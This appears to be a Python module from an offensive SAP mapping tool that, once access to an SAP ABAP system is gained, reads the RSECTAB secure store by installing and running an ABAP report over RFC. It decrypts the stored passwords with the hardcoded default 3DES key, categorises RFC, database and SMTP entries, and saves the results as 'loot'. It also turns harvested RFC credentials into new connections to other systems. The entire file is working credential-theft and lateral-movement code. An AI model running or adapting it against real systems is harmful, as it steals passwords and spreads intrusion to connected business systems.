"""
sapmap_secstore.py – SAP ABAP Secure Store (RSECTAB) reader and decryptor.

After gaining access to an SAP ABAP system, reads the RSECTAB table via
RFC_READ_TABLE and decrypts each row using the 3DES-based scheme described
in the ERPScan research "All your SAP passwords belong to us" (2014).

Algorithm (Python 3 port of the original Python 2.7 / pyDes implementation):

  Step 1 — decrypt ciphertext with default key (keydef)   → data_pass1
  Step 2 — extract SID and instance number from data_pass1
           derive keyprime = XOR keydef bytes with MD5(SID+instno) nibbles
  Step 3 — decrypt first 136 bytes of data_pass1 with keyprime → data_pass2
  Step 4 — extract password from data_pass2[2 : 2+pass_len]

The "triple-DES" is a manual 3-pass scheme (NOT standard EDE 3DES):
  pass 1: DES-CBC decrypt  with key[16:24]
  pass 2: DES-CBC encrypt  with key[8:16]
  pass 3: DES-CBC decrypt  with key[0:8]
  IV = 8 null bytes for every pass.

Requires pycryptodome:  pip install pycryptodome
"""

import datetime
import hashlib
import json
import os
import re
import traceback

try:
    from Crypto.Cipher import DES as _CryptoDES
    _HAVE_CRYPTO = True
except ImportError:
    _HAVE_CRYPTO = False

import sapmap_rfc
from sapmap_models import Credentials, RFCConnection

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Default 24-byte 3DES key hardcoded in SAP installations (all systems share
# this key unless the admin has configured an individual key).
DEFAULT_KEY_HEX = "b1e09244ec19eb3401dfc846ab225820c71bc376581eb3e4"

# RSECTAB.DATA is RAW(184) = 184 bytes = 368 hex chars
_DATA_LEN_BYTES = 184


# ---------------------------------------------------------------------------
# Internal crypto helpers
# ---------------------------------------------------------------------------

def _require_crypto():
    if not _HAVE_CRYPTO:
        raise RuntimeError(
            "pycryptodome is required for SecStore decryption. "
            "Install with:  pip install pycryptodome"
        )


def _des3_manual(key24: bytes, data: bytes) -> bytes:
    """
    SAP SecStore manual 3-pass DES (CBC, IV=0x00*8):
      pass 1: decrypt  key[16:24]
      pass 2: encrypt  key[8:16]
      pass 3: decrypt  key[0:8]
    """
    iv = b"\x00" * 8

    c1 = _CryptoDES.new(key24[16:24], _CryptoDES.MODE_CBC, iv)
    d = c1.decrypt(data)

    c2 = _CryptoDES.new(key24[8:16], _CryptoDES.MODE_CBC, iv)
    d = c2.encrypt(d)

    c3 = _CryptoDES.new(key24[:8], _CryptoDES.MODE_CBC, iv)
    d = c3.decrypt(d)
    return d


def _derive_keyprime(keydef: bytes, data_pass1: bytes) -> bytes:
    """
    Derive the per-system keyprime by XOR-ing specific bytes of keydef with
    nibbles of MD5(SID + instance_number) embedded at the end of data_pass1.
    Mirrors the keyprime[] array manipulation in the original Python 2.7 script.
    """
    sid    = data_pass1[-44:-41]   # 3 bytes
    instno = data_pass1[-41:-31]   # 10 bytes

    h = hashlib.md5()
    h.update(sid + instno)
    m = h.digest()                 # 16 bytes

    kp = bytearray(keydef)
    kp[1]  ^= m[0] & 0xF0
    kp[6]  ^= m[0] & 0x0F
    kp[7]  ^= m[3] & 0xF0
    kp[10] ^= m[1] & 0xF0
    kp[13] ^= m[1] & 0x0F
    kp[16] ^= m[4] & 0x0F
    kp[19] ^= m[2] & 0xF0
    kp[20] ^= m[2] & 0x0F
    return bytes(kp)


# ---------------------------------------------------------------------------
# Public decrypt function
# ---------------------------------------------------------------------------

def decrypt_entry(data_hex: str, key_hex: str = DEFAULT_KEY_HEX) -> dict:
    """
    Decrypt one RSECTAB DATA value (hex string, 368 chars).

    Returns a dict:
      password      – decrypted password string  (None on failure)
      password_len  – declared length byte from the structure
      sid           – SID extracted from the decrypted structure
      instance_nr   – installation/instance number extracted
      error         – error message string, or None on success
    """
    result = {
        "password": None,
        "password_len": 0,
        "sid": "",
        "instance_nr": "",
        "error": None,
    }
    try:
        keydef = bytes.fromhex(key_hex)
        data   = bytes.fromhex(data_hex)

        if len(data) != _DATA_LEN_BYTES:
            result["error"] = (
                "unexpected DATA length %d bytes (expected %d)"
                % (len(data), _DATA_LEN_BYTES)
            )
            return result

        # Step 1: decrypt with default/supplied key
        data_pass1 = _des3_manual(keydef, data)

        # Step 2: derive per-system keyprime
        keyprime = _derive_keyprime(keydef, data_pass1)

        # Step 3: decrypt first 136 bytes with keyprime
        data_pass2 = _des3_manual(keyprime, data_pass1[:136])

        # Step 4: parse structure
        #   data_pass2[0:2]    – prefix (2 bytes)
        #   data_pass2[2:111]  – password (up to 109 bytes)
        #   data_pass2[111]    – password length byte
        #   data_pass2[112:116] – magic local
        #   data_pass2[116:120] – magic global salted
        #   data_pass2[120:136] – rec identifier hash
        #   data_pass1[140:143] – SID
        #   data_pass1[143:153] – installation/instance number
        pass_len    = data_pass2[111]
        pass_bytes  = data_pass2[2:2 + min(pass_len, 109)]
        sid         = data_pass1[140:143].rstrip(b"\x00").decode("ascii", errors="replace").strip()
        inst_nr     = data_pass1[143:153].rstrip(b"\x00").decode("ascii", errors="replace").strip()

        result["password"]    = pass_bytes.decode("latin-1", errors="replace")
        result["password_len"] = pass_len
        result["sid"]         = sid
        result["instance_nr"] = inst_nr

    except Exception:
        result["error"] = traceback.format_exc(limit=2)

    return result


# ---------------------------------------------------------------------------
# ABAP program to read RSECTAB with proper hex encoding of the RAW field
# ---------------------------------------------------------------------------

# RFC_READ_TABLE cannot reliably handle RAW(184) fields: binary data may
# contain the pipe delimiter and break row parsing.  Instead we run a tiny
# ABAP report via RFC_ABAP_INSTALL_AND_RUN that reads RSECTAB, hex-encodes
# the DATA field, and writes one line per row as  IDENT~~~hex_DATA .
# Output per RSECTAB row uses 3 short lines to stay within the WRITES
# table ZEILE width limit (~256 chars in RFC_ABAP_INSTALL_AND_RUN):
#   ~~~I <MANDT> <IDENT>        (ident line)
#   ~~~A <first 184 hex chars>  (hex part 1: bytes 0-91)
#   ~~~B <rest 184 hex chars>   (hex part 2: bytes 92-183)
_ABAP_READ_RSECTAB = [
    "REPORT ZSECSTORE LINE-SIZE 500.",
    "TABLES: RSECTAB.",
    "DATA: HEXSTR(368) TYPE C.",
    "DATA: BYTE TYPE X LENGTH 1.",
    "DATA: HI TYPE I.",
    "DATA: LO TYPE I.",
    "DATA: BIDX TYPE I.",
    "DATA: HIDX TYPE I.",
    "DATA: CNT TYPE I.",
    "DATA: HC(16) TYPE C VALUE '0123456789ABCDEF'.",
    "SELECT * FROM RSECTAB CLIENT SPECIFIED.",
    "  CLEAR HEXSTR.",
    "  DO 184 TIMES.",
    "    BIDX = SY-INDEX - 1.",
    "    BYTE = RSECTAB-DATA+BIDX(1).",
    "    HI = BYTE DIV 16.",
    "    LO = BYTE MOD 16.",
    "    HIDX = BIDX * 2.",
    "    HEXSTR+HIDX(1) = HC+HI(1).",
    "    HIDX = HIDX + 1.",
    "    HEXSTR+HIDX(1) = HC+LO(1).",
    "  ENDDO.",
    "  WRITE: / '~~~I', RSECTAB-MANDT, RSECTAB-IDENT.",
    "  WRITE: / '~~~A', HEXSTR(184).",
    "  WRITE: / '~~~B', HEXSTR+184(184).",
    "  CNT = CNT + 1.",
    "ENDSELECT.",
    "WRITE: / '~~~TOTAL:', CNT.",
]


# ---------------------------------------------------------------------------
# Main entry point: read RSECTAB and decrypt all rows
# ---------------------------------------------------------------------------

def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX) -> list:
    """
    1. Read RSECTAB via ABAP program (hex-encodes the RAW DATA field).
    2. Decrypt each row.
    3. Return a list of dicts: ident, password, sid, instance_nr, error.
    """
    _require_crypto()

    # --- Try ABAP execution first (reliable for RAW fields) ---------------
    rows = _read_rsectab_via_abap(node, creds)

    if rows is None:
        # Fall back to RFC_READ_TABLE (may work on some systems)
        print("[*] SecStore: ABAP exec unavailable, falling back to RFC_READ_TABLE")
        rows = _read_rsectab_via_rfc(node, creds)

    if not rows:
        print(f"[-] SecStore {node.sid}: no rows returned from RSECTAB")
        return []

    print(f"[*] SecStore {node.sid}: {len(rows)} rows read, decrypting...")

    results = []
    for ident, data_hex in rows:
        entry = {"ident": ident}

        if not data_hex:
            entry["error"] = "empty DATA field"
            results.append(entry)
            continue

        if len(data_hex) != _DATA_LEN_BYTES * 2:
            entry["error"] = (
                "DATA field length %d hex chars (expected %d)"
                % (len(data_hex), _DATA_LEN_BYTES * 2)
            )
            results.append(entry)
            continue

        dec = decrypt_entry(data_hex, key_hex)
        entry.update(dec)
        results.append(entry)

    return results


def _read_rsectab_via_abap(node, creds) -> list | None:
    """Read RSECTAB via RFC_ABAP_INSTALL_AND_RUN.

    Returns list of (ident, data_hex) tuples, or None if the FM is not
    available.
    """
    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            res = sapmap_rfc._run_abap_program(conn, _ABAP_READ_RSECTAB,
                                                "ZSECSTORE")
            if not res.get("success") and "not available" in (res.get("error") or ""):
                return None  # FM not available — caller will fall back

            if not res.get("success"):
                print(f"[-] SecStore ABAP exec error: {res.get('error')}")
                return None

            output = res.get("output", [])
            print(f"[*] SecStore ABAP output: {len(output)} lines")
            if output:
                # Show first few lines for diagnostics
                for i, line in enumerate(output[:3]):
                    print(f"    line {i}: {line[:120]}{'...' if len(line) > 120 else ''}")

            # Parse 3-line groups: ~~~I (ident), ~~~A (hex part1), ~~~B (hex part2)
            rows = []
            cur_ident = None
            cur_hex   = ""
            for line in output:
                if line.startswith("~~~TOTAL:"):
                    total = line.split(":", 1)[1].strip()
                    print(f"[*] SecStore ABAP: {total} rows in RSECTAB")
                    continue
                if line.startswith("~~~I"):
                    # Flush previous entry
                    if cur_ident is not None and cur_hex:
                        rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
                    cur_ident = line[4:].strip()
                    cur_hex   = ""
                elif line.startswith("~~~A"):
                    cur_hex = line[4:].strip()
                elif line.startswith("~~~B"):
                    cur_hex += line[4:].strip()
            # Flush last entry
            if cur_ident is not None and cur_hex:
                rows.append((cur_ident, cur_hex.replace(" ", "").upper()))
            return rows

    except Exception as e:
        print(f"[-] SecStore ABAP read failed: {e}")
        return None


def _read_rsectab_via_rfc(node, creds) -> list | None:
    """Fallback: read RSECTAB via RFC_READ_TABLE (unreliable for RAW fields)."""
    try:
        raw_rows = sapmap_rfc.read_table(
            node, "RSECTAB",
            fields=["IDENT", "DATA"],
            where="", max_rows=9999, creds=creds,
        )
        rows = []
        for r in raw_rows:
            ident    = (r.get("IDENT") or "").strip()
            data_hex = (r.get("DATA") or "").strip().replace(" ", "").upper()
            rows.append((ident, data_hex))
        return rows
    except Exception as e:
        print(f"[-] SecStore RFC_READ_TABLE failed: {e}")
        return None


# ---------------------------------------------------------------------------
# Categorisation and map integration
# ---------------------------------------------------------------------------

# Regex patterns for parsing IDENT strings
_RE_RFC_WITH_USER = re.compile(
    r"^/RFC/([A-Za-z0-9_]+)@([A-Z0-9]{3})(?:CLNT(\d{3}))?(?:\.|$)"
)
_RE_RFC_SIMPLE = re.compile(r"^/RFC/(.+)$")
_RE_DBCON = re.compile(r"^/DBCON/(.+)$")
_RE_CTS = re.compile(r"^/CTS/")
_RE_STRUST = re.compile(r"^/STRUST_PSE_PIN/")
_RE_HMAC = re.compile(r"^/HMAC_INDEP/")


def categorise_entry(entry: dict) -> dict:
    """Add category and parsed fields to a decrypted SecStore entry.

    Modifies and returns the entry dict with added keys:
      category    – rfc | db | cts | smtp | hmac | pse | other
      dest_name   – RFC destination name (rfc only)
      target_sid  – target SID parsed from ident (rfc only)
      rfc_user    – RFC logon user parsed from ident (rfc only)
      rfc_client  – client parsed from CLNTnnn (rfc only)
      mandt       – SAP client extracted from the MANDT prefix
    """
    raw_ident = entry.get("ident", "")

    # Strip the MANDT prefix that the ABAP program prepends.
    # Format: "NNN /path/..." or "    /path/..." (spaces/underscores for cross-client)
    mandt = ""
    ident = raw_ident
    m_prefix = re.match(r"^(\d{3}|[_ ]{3})\s+(.*)$", raw_ident)
    if m_prefix:
        mandt = m_prefix.group(1).strip().replace("_", "")
        ident = m_prefix.group(2)
    entry["mandt"] = mandt
    entry["ident_clean"] = ident

    # --- RFC destinations ---
    m = _RE_RFC_WITH_USER.match(ident)
    if m:
        entry["category"]   = "rfc"
        entry["rfc_user"]   = m.group(1)
        entry["target_sid"] = m.group(2)
        entry["rfc_client"] = m.group(3) or ""
        entry["dest_name"]  = ident[5:]  # everything after /RFC/
        return entry

    m = _RE_RFC_SIMPLE.match(ident)
    if m:
        dest = m.group(1)
        entry["category"]   = "rfc"
        entry["dest_name"]  = dest
        # If dest_name looks like a 3-char SID, use it as target_sid
        entry["target_sid"] = dest if re.match(r"^[A-Z][A-Z0-9]{2}$", dest) else ""
        entry["rfc_user"]   = ""
        entry["rfc_client"] = ""
        return entry

    # --- DB connections ---
    if _RE_DBCON.match(ident):
        entry["category"] = "db"
        return entry

    # --- CTS transport ---
    if _RE_CTS.match(ident):
        entry["category"] = "cts"
        return entry

    # --- SMTP ---
    if "SMTP" in ident.upper():
        entry["category"] = "smtp"
        return entry

    # --- HMAC ---
    if _RE_HMAC.match(ident):
        entry["category"] = "hmac"
        return entry

    # --- PSE / certificate PIN ---
    if _RE_STRUST.match(ident):
        entry["category"] = "pse"
        return entry

    entry["category"] = "other"
    return entry


def integrate_results(node, state, results: list):
    """Integrate decrypted SecStore results into the SAPMAP state.

    1. Store categorised entries on the node.
    2. Enrich existing RFC connections with decrypted passwords.
    3. Add credentials to target nodes on the map.
    """
    # Categorise every entry
    for entry in results:
        categorise_entry(entry)

    # Store on node
    node.secstore_entries = results

    rfc_entries = [e for e in results
                   if e.get("category") == "rfc" and e.get("password")]

    # --- Enrich existing connections ---
    for entry in rfc_entries:
        dest = entry.get("dest_name", "")
        if not dest:
            continue
        for conn in state.get_connections_from(node.sid):
            if conn.destination_name == dest:
                conn.secstore_password = entry["password"]
                print(f"[+] SecStore: enriched RFC dest {dest} with password")
                break

    # --- Add credentials to target nodes ---
    for entry in rfc_entries:
        target_sid = entry.get("target_sid", "")
        target_node = state.get_node(target_sid) if target_sid else None
        if not target_node:
            continue

        rfc_user  = entry.get("rfc_user", "")
        password  = entry["password"]
        client    = entry.get("rfc_client", "") or "000"

        if not rfc_user:
            # Try to derive user from dest_name for simple /RFC/<dest> patterns
            # e.g., /RFC/TMSADM@... → user TMSADM
            continue

        # Avoid duplicates
        already = any(
            c.username.upper() == rfc_user.upper() and c.client == client
            for c in target_node.credentials
        )
        if not already:
            cred = Credentials(
                username=rfc_user,
                password=password,
                client=client,
                instance_nr=target_node.instance_nrs()[0] if target_node.instance_nrs() else "00",
                verified=False,
            )
            target_node.credentials.append(cred)
            print(f"[+] SecStore: added credentials {rfc_user}@{target_sid} "
                  f"client {client} (from RSECTAB)")

        # Create RFC connection if none exists yet
        existing = any(
            c.destination_name == entry.get("dest_name", "")
            for c in state.get_connections_from(node.sid)
        )
        if not existing:
            conn = RFCConnection(
                source_sid=node.sid,
                source_host=node.hostname or node.ip,
                target_sid=target_sid,
                target_host=target_node.hostname or target_node.ip,
                target_ip=target_node.ip,
                destination_name=entry.get("dest_name", ""),
                rfc_user=rfc_user,
                client=client,
                secstore_password=password,
            )
            state.add_connection(conn)
            print(f"[+] SecStore: created RFC connection {node.sid} → "
                  f"{target_sid} via {entry.get('dest_name', '')}")


# ---------------------------------------------------------------------------
# Loot persistence
# ---------------------------------------------------------------------------

def save_loot(node_sid: str, results: list, states_dir: str) -> str:
    """Save decrypted results as JSON loot file. Returns absolute file path."""
    os.makedirs(states_dir, exist_ok=True)
    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = os.path.join(states_dir, f"secstore_{node_sid}_{ts}.json")
    with open(filename, "w") as f:
        json.dump(results, f, indent=2)
    return filename
